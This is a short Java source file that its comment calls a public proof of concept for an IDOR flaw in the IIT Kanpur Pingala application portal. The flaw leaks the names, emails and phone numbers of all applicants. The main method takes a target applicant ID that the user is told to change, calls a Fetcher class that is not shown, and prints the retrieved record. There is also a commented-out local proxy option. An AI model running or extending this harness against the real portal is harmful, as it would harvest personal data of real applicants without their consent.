import java.net.InetSocketAddress;
import java.net.ProxySelector;

public class Main {
    /*
    Public PoC of IDOR vulnerability in IIT Kanpur Pingala Application Portal that leaks name, email, phone number of all applicants.
     */


    public static ProxySelector proxySelector = null;

    //Uncomment the below code to route the traffic through proxy
    /*
    static {
        proxySelector = ProxySelector.of(
                new InetSocketAddress("localhost", 8080)
        );
    }
     */




    public static void main(String[] args)throws Exception{
        int target = 819; //Change this number according to your need

        UserDatIITK user = Fetcher.fetchInfo(target);

        System.out.println(user);
    }
}
